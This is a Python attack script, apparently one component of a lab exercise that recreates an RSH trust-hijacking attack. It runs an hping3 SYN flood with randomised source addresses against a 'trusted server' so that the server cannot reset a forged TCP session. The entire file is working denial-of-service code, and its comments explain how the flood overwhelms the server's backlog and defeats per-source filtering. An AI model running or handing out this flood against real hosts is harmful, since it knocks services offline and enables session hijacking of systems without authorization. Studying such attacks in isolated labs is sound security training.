"""
dos.py — SYN Flood against the Trusted Server

Role in the attack: The target (10.0.2.20) trusts connections from the trusted
server (10.0.2.30) via RSH. If the real server receives an unexpected SYN/ACK
(one it never asked for), it will reply with RST, instantly tearing down the
forged session before we can inject the payload.

The fix: exhaust the server's TCP backlog queue with a SYN flood so it has no
capacity to generate RST replies. As long as the queue is full, new half-open
connections are silently dropped — which is exactly what we need.
"""

import subprocess
import time


def start_dos_attack(target_ip, target_port):
    """
    Launch a background SYN flood using hping3.

    Why hping3 instead of Scapy?
    hping3 is a C binary that writes raw packets at wire speed without Python's
    GIL or per-packet interpreter overhead. A Scapy loop in the same role would
    be orders of magnitude slower and might not fill the backlog fast enough
    before our forged SYN reaches the target.

    Flag rationale:
      -S             send SYN-only packets (smallest valid TCP packet, maximum rate)
      --flood        disable inter-packet delay; saturate as fast as possible
      --rand-source  randomise the source IP on every packet so the server can't
                     drain the queue by sending RSTs back to a single host or
                     defend with a simple per-IP filter / SYN cookie per source

    The server container has net.ipv4.tcp_syncookies=0 (set in docker-compose),
    which disables the kernel's built-in SYN-flood mitigation so our flood
    actually fills the backlog.
    """
    print(f"Starting SYN flood attack on {target_ip}:{target_port}")

    command = [
        "hping3",
        "-S",
        "-p", str(target_port),
        "--flood",
        "--rand-source",
        target_ip,
    ]

    # Popen (not run/call) keeps hping3 alive in the background so the main
    # thread can continue setting up ARP spoofing and the sniffer in parallel.
    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    print("DoS attack started.")
    return process


def stop_dos_attack(process):
    """
    Gracefully terminate the hping3 process.

    SIGTERM + wait() is used instead of SIGKILL so that hping3 can flush its
    internal stats and release the raw socket before the process exits.
    Leaving zombie processes or orphaned sockets could interfere with subsequent
    cleanup steps (e.g., iptables rule removal).
    """
    print("Stopping DoS attack...")
    process.terminate()
    process.wait()
    print("DoS attack stopped.")


# ---------------------------------------------------------------------------
# Standalone smoke-test: flood for 10 seconds then stop.
# ---------------------------------------------------------------------------
if __name__ == "__main__":
    target_ip   = "10.0.2.30"
    target_port = 514

    process = start_dos_attack(target_ip, target_port)
    try:
        time.sleep(10)
    finally:
        stop_dos_attack(process)
